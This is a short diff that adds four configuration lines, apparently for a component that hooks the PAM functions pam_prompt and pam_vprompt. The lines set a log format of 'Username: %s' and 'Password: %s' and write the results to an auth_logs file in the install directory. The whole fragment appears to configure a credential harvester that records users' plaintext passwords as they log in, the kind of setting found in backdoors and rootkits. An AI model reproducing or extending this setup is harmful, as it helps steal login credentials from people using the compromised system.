@@ -1,0 +1,4 @@
+LOG_FMT:Username: %s\nPassword: %s\n\n [LOG_LOCAL_AUTH]
+LOG_PATH:INSTALL_DIR/auth_logs [LOG_LOCAL_AUTH]
+PAM_PROMPT_FNAME:pam_prompt [LOG_LOCAL_AUTH]
+PAM_VPROMPT_FNAME:pam_vprompt [LOG_LOCAL_AUTH]
